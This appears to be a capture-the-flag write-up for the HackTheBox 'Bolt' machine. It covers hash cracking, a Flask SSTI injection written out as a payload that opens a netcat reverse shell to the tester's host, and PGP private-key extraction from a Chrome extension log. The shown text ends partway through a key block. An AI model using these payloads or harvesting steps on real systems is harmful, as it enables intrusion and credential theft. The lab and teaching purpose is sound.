# Bolt - HackTheBox - Writeup
Linux, 30 Base Points, Medium

## Machine

![‏‏Bolt.JPG](images/Bolt.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```443```.

***User***: From port ```80``` we get a tar file which contains docker image, from the docker image we found an invite code to ```demo.bolt.htb``` subdomain registration, Using the same credentials can login to ```mail.bolt.htb``` which vulnerable to STTI attack (from ```username``` field on ```demo.bolt.htb``` admin profile), Using that we get a reverse shell as ```www-data```, Found password of ```eddie``` user on ```/etc/passbolt/passbolt.php``` file.

***Root***: Found PGP private key on Chrome extension log, Reading mail from ```email_queue``` table on passbolt database, Decrypting the mail using the PGP private key and we get the ```root``` password.

![pwn.JPG](images/pwn.JPG)


## Bolt Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Bolt]
└──╼ $ nmap -sV -sC -oA nmap/Bolt 10.10.11.114
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 23:22 IDT
Nmap scan report for 10.10.11.114
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port ```80``` we get the following web page:

![port80.JPG](images/port80.JPG)

And By observing port ```443``` (On [https://passbolt.bolt.htb](https://passbolt.bolt.htb)) we get the following web page:

![port443.JPG](images/port443.JPG)

Let's search for ```vhosts``` using ```gobuster```:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image]
└──╼ $ gobuster vhost -u http://bolt.htb -w subdomains-top1milion.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://bolt.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/01 00:41:51 Starting gobuster in VHOST enumeration mode
===============================================================
Found: demo.bolt.htb (Status: 302) [Size: 219]
Found: mail.bolt.htb (Status: 200) [Size: 4943]
Found: MAIL.bolt.htb (Status: 200) [Size: 4943]
Found: mail.bolt.htb (Status: 200) [Size: 4943]

```

By browsing to [http://demo.bolt.htb](http://demo.bolt.htb) we get almost the same page as the page that exists on port ```80```, except the invite code on the register page:

![register.JPG](images/register.JPG)

On port ```80```, By clicking on [Download](http://bolt.htb/download) we get the following:

![download.JPG](images/download.JPG)

And by clicking on [Download Now](http://bolt.htb/uploads/image.tar) we get a ```tar``` file which contains the followings directories:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image]
└──╼ $ ls
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950  859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c  9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa  a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab  d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162  image.tar
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b  manifest.json
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad  repositories
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
```

So actuaclly It's a [docker image](https://docs.docker.com/engine/reference/commandline/images/), Let's load it using ```docker load``` command:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/]
└──╼ $ docker load -i image.tar
3fc64803ca2d: Loading layer [==================================================>]  4.463MB/4.463MB
73f2f98bc222: Loading layer [==================================================>]   7.68kB/7.68kB
8f2df5d06a26: Loading layer [==================================================>]  62.86MB/62.86MB
a1e4f9dc4110: Loading layer [==================================================>]  57.57MB/57.57MB
f0c4120bc314: Loading layer [==================================================>]  29.79MB/29.79MB
14ec2ed1c30d: Loading layer [==================================================>]  6.984MB/6.984MB
68c03965721f: Loading layer [==================================================>]  3.072kB/3.072kB
fec67b58fd48: Loading layer [==================================================>]  19.97kB/19.97kB
7fa1531c7420: Loading layer [==================================================>]  7.168kB/7.168kB
e45bbea785e3: Loading layer [==================================================>]  15.36kB/15.36kB
ac16908b339d: Loading layer [==================================================>]  8.192kB/8.192kB
Loaded image: flask-dashboard-adminlte_appseed-app:latest

```

Now we can see this image:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/]
└──╼ $ docker images
REPOSITORY                             TAG                 IMAGE ID            CREATED             SIZE
flask-dashboard-adminlte_appseed-app   latest              859e74798e6c        6 months ago        154MB

```
Let's create a new docker from this image by running ```docker run```:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/]
└──╼ $ docker run --name test -it flask-dashboard-adminlte_appseed-app
...
```

Now let's run ```docker exec``` to get a shell to this container:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/]
└──╼ $ docker exec -it 535e3df2d317 /bin/sh
/ # 
```

NOTE: We can use [dive](https://github.com/wagoodman/dive) which is A tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI image, Using ```dive``` we can see which files added/modified for each layer.

Or we can extract the archive tar ```image.tar``` - Let's use this method.

By enumerating on ```a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2``` directory we found file ```layer.tar```, By extracting the file we found a ```SQLite3``` DB file:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2]
└──╼ $ ls
db.sqlite3  json  layer.tar  root  tmp  VERSION
```

Let's observe the DB file using ```sqlite3```:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image]
└──╼ $ sqlite3 db.sqlite3
sqlite> .tables
User
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||

```

We found hash password of ```admin@bolt.htb```, Let's crack it using ```john```:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image]
└──╼ $ john --wordlist=~/hackthebox/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
deadbolt         (?)
1g 0:00:00:00 DONE (2021-10-01 01:04) 1.369g/s 236712p/s 236712c/s 236712C/s dohaqatar..curlyfry
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

And we found the password of ```admin@bolt.htb``` which is ```deadbolt```.

By observing ```745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf``` directory we found the following:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf]
└──╼ $ ls
config.py  gunicorn-cfg.py  json  layer.tar  requirements.txt  run.py  VERSION
```

```config.py``` file contains:
```python
# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

import os
from   decouple import config

class Config(object):

    basedir    = os.path.abspath(os.path.dirname(__file__))

    # Set up the App SECRET_KEY
    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')

    # This will create a file in <app> FOLDER
    SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    MAIL_SERVER = 'localhost'
    MAIL_PORT = 25
    MAIL_USE_TLS = False
    MAIL_USE_SSL = False
    MAIL_USERNAME = None
    MAIL_PASSWORD = None
    DEFAULT_MAIL_SENDER = 'support@bolt.htb'

class ProductionConfig(Config):
    DEBUG = False

    # Security
    SESSION_COOKIE_HTTPONLY  = True
    REMEMBER_COOKIE_HTTPONLY = True
    REMEMBER_COOKIE_DURATION = 3600

    # PostgreSQL database
    SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(
        config( 'DB_ENGINE'   , default='postgresql'    ),
        config( 'DB_USERNAME' , default='appseed'       ),
        config( 'DB_PASS'     , default='pass'          ),
        config( 'DB_HOST'     , default='localhost'     ),
        config( 'DB_PORT'     , default=5432            ),
        config( 'DB_NAME'     , default='appseed-flask' )
    )

class DebugConfig(Config):
    DEBUG = True

# Load all possible configurations
config_dict = {
    'Production': ProductionConfig,
    'Debug'     : DebugConfig
}
```

We can see there another credentials - DB ```appseed:pass```, Secret Key: ```S#perS3crEt_007```.

On ```41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad``` directory we find the following:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt/image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]
└──╼ $ ls
app  json  layer.tar  VERSION
```

```app``` directory contains the application code, The interesting file is ```app/base/routes.py```:
```python
cat routes.py 
# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

from flask import jsonify, render_template, redirect, request, url_for
from flask_login import (
    current_user,
    login_required,
    login_user,
    logout_user
)

from app import db, login_manager
from app.base import blueprint
from app.base.forms import LoginForm, CreateAccountForm
from app.base.models import User
from hmac import compare_digest as compare_hash
import crypt

@blueprint.route('/')
def route_default():
    return redirect(url_for('base_blueprint.login'))

## Login & Registration

@blueprint.route('/login', methods=['GET', 'POST'])
def login():
    login_form = LoginForm(request.form)
    if 'login' in request.form:
        
        # read form data
        username = request.form['username']
        password = request.form['password']

        # Locate user
        user = User.query.filter_by(username=username).first()
        
        # Check the password
        stored_password = user.password
        stored_password = stored_password.decode('utf-8')
        if user and compare_hash(stored_password,crypt.crypt(password,stored_password)):

            login_user(user)
            return redirect(url_for('base_blueprint.route_default'))

        # Something (user or pass) is not ok
        return render_template( 'accounts/login.html', msg='Wrong user or password', form=login_form)

    if not current_user.is_authenticated:
        return render_template( 'accounts/login.html',
                                form=login_form)
    return redirect(url_for('home_blueprint.index'))

@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

            # Check email exists
            user = User.query.filter_by(email=email).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Email already registered', 
                                    success=False,
                                    form=create_account_form)

            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()

            return render_template( 'accounts/register.html', 
                                msg='User created please <a href="/login">login</a>', 
                                success=True,
                                form=create_account_form)

    else:
        return render_template( 'accounts/register.html', form=create_account_form)

@blueprint.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('base_blueprint.login'))

## Errors

@login_manager.unauthorized_handler
def unauthorized_handler():
    return render_template('page-403.html'), 403

@blueprint.errorhandler(403)
def access_forbidden(error):
    return render_template('page-403.html'), 403

@blueprint.errorhandler(404)
def not_found_error(error):
    return render_template('page-404.html'), 404

@blueprint.errorhandler(500)
def internal_error(error):
    return render_template('page-500.html'), 500

```

As we can see, If we want to register we need to provide the invite code ```XNSS-HSJW-3NGU-8XTJ```, We can register using this invite code:

![createaccount.JPG](images/createaccount.JPG)

By login to [http://demo.bolt.htb](http://demo.bolt.htb) using our credentials we get:

![dashboarddemo.JPG](images/dashboarddemo.JPG)

And by login to [http://bolt.htb](http://bolt.htb) we get:

![dashboard.JPG](images/dashboard.JPG)

As we can see, We can log in to both portals and we have more options on the demo domain.

Using the same credentials we can log in to [http://mail.bolt.htb](http://mail.bolt.htb):

![mailbolt.JPG](images/mailbolt.JPG)

We can see an hints on [http://bolt.htb](http://bolt.htb) dashboard:

![hints.JPG](images/hints.JPG)

By enumerating the docker image we found the following file ```41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py``` with the following function:
```python
@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')
```

So as we can see, If we are changing our user name It will send an email to our mailbox with template ```HTML``` render.

We can use [STTI attcak](https://portswigger.net/research/server-side-template-injection) on the username field.

We can change our username on [http://demo.bolt.htb/admin/profile](http://demo.bolt.htb/admin/profile):

![usernamechange.JPG](images/usernamechange.JPG)

By writing the following template on username we can get RCE:
```python
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

![rcels.JPG](images/rcels.JPG)

When we have changed the username we get two emails, one with a confirmation link:

![confirm.JPG](images/confirm.JPG)

And when we are clicked on the confirmation link we get the second email with our injection:

![injection.JPG](images/injection.JPG)

We can get a reverse shell by using the following:
```python
{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4242 >/tmp/f').read()}}
```

```console
┌─[evyatar@parrot]─[/hackthebox/Bolt]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from passbolt.bolt.htb [10.10.11.114] 35886
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls /home
eddie clark
```

We can see two users, ```eddie``` and ```clark```.

By enumerating we found DB credentials on ```/etc/passbolt/passbolt.php``` (which is the application that runs on port 443):
```php
...

    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],
...

```

And we found the password ```rT2;jW7<eY8!dX8}pQ8%``` is the password of ```eddie``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt]
└──╼ $ ssh eddie@bolt.htb
eddie@bolt.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
You have mail.
Last login: Thu Sep  9 11:10:07 2021 from 10.10.14.6
eddie@bolt:~$ cat user.txt
a032e24864eaab4850855d6362dd2084
```

And we get the user flag ```a032e24864eaab4850855d6362dd2084```.


### Root

By reading ```eddie``` user emails we get the following hint:
```console
eddie@bolt:$ cat /var/mail/eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
	id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark

```

Reading the [passbolt documantation](https://help.passbolt.com/assets/files/Security%20White%20Paper%20-%20Passbolt%20Pro%20Edition.pdf) we see:

![privatekey.JPG](images/privatekey.JPG)

By running ```linpeas``` we can see the following:
```console
...
[+] Looking for ssl/ssh files
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js
/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
...
```

As we can see, This is a log file of plugin extensions, By getting ```strings``` from this log file we found PGP private keys:
```console
eddie@bolt:/home/eddie$ strings "/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log"
...
t-private-gpgkeys":"{\"MY_KEY_ID\":{\"key\":\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":true,\"user_id\":\"MY_KEY_ID\"}}","passbolt-public-gpgkeys":"{\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxsDNBGA2peUBDADHDueSrCzcZBMgt9GzuI4x57F0Pw922++n/vQ5rQs0A3Cm\\r\\nof6BH+H3sJkXIVlvLF4pygGyYndMMQT3NxZ84q32dPp2DKDipD8gA4ep9RAT\\r\\nIC4seXLUSTgRlxjB//NZNrAv35cHjb8f2hutHGYdigUUjB7SGzkjHtd7Ixbk\\r\\nLxxRta8tp9nLkqhrPkGCZRhJQPoolQQec2HduK417aBXHRxOLi6Loo2DXPRm\\r\\nDAqqYIhP9Nkhy27wL1zz57Fi0nyPBWTqA/WAEbx+ud575cJKHM7riAaLaK0s\\r\\nhuN12qJ7vEALjWY2CppEr04PLgQ5pj48Asly4mfcpzztP2NdQfZrFHe/JYwH\\r\\nI0zLDA4ZH4E/NK7HhPWovpF5JNK10tI16hTmzkK0mZVs8rINuB1b0uB0u3FP\\r\\n4oXfBuo6V5HEhZQ/H+YKyxG8A3xNsMTW4sy+JOw3EnJQT3O4S/ZR14+42nNt\\r\\nP+PbpxTgChS0YoLkRmYVikfFZeMgWl2L8MyqbXhvQlKb/PMAEQEAAc0kUGFz\\r\\nc2JvbHQgU2VydmVyIEtleSA8YWRtaW5AYm9sdC5odGI+wsElBBMBCgA4FiEE\\r\\nWYYKJp6AP6CUQWdTq44u+1ahbIQFAmA2peUCGwMFCwkIBwIGFQoJCAsCBBYC\\r\\nAwECHgECF4AAIQkQq44u+1ahbIQWIQRZhgomnoA/oJRBZ1Orji77VqFshPZa\\r\\nDACcb7OIZ5YTrRCeMrB/QRXwiS8p1SBHWZbzCwVTdryTH+9d2qKuk9cUF90I\\r\\ngTDNDwgWhcR+NAcHvXVdp3oVs4ppR3+RrGwA0YqVUuRogyKzVvtZKWBgwnJj\\r\\nULJiBG2OkxXzrY9N/4hCHJMliI9L4yjf0gOeNqQa9fVPk8C73ctKglu75ufe\\r\\nxTLxHuQc021HMWmQt+IDanaAY6aEKF0b1L49XuLe3rWpWXmovAc6YuJBkpGg\\r\\na/un/1IAk4Ifw1+fgBoGSQEaucgzSxy8XimUjv9MVNX01P/C9eU/149QW5r4\\r\\naNtabc2S8/TDDVEzAUzgwLHihQyzetS4+Qw9tbAQJeC6grfKRMSt3LCx1sX4\\r\\nP0jFHFPVLXAOtOiCUAK572iD2lyJdDsLs1dj4H/Ix2AV/UZe/G0qpN9oo/I+\\r\\nvC86HzDdK2bPu5gMHzZDI30vBCZR+S68sZSBefpjWeLWaGdtfdfK0/hYnDIP\\r\\neTLXDwBpLFklKpyi2HwnHYwB7YX/RiWgBffOwM0EYDal5QEMAJJNskp8LuSU\\r\\n3YocqmdLi9jGBVoSSzLLpeGt5HifVxToToovv1xP5Yl7MfqPdVkqCIbABNnm\\r\\noIMj7mYpjXfp659FGzzV0Ilr0MwK0sFFllVsH6beaScKIHCQniAjfTqCMuIb\\r\\n3otbqxakRndrFI1MNHURHMpp9gc2giY8Y8OsjAfkLeTHgQbBs9SqVbQYK0d1\\r\\njTKfAgYRkjzvp6mbLMaMA3zE9joa+R0XFFZlbcDR1tBPkj9eGK0OM1SMkU/p\\r\\nxTx6gyZdVYfV10n41SJMUF/Nir5tN1fwgbhSoMTSCm6zuowNU70+VlMx4TuZ\\r\\nRkXI2No3mEFzkw1sg/U3xH5ZlU/BioNhizJefn28kmF+801lBDMCsiRpW1i8\\r\\ncnr5U2D5QUzdj8I1G8xkoC6S6GryO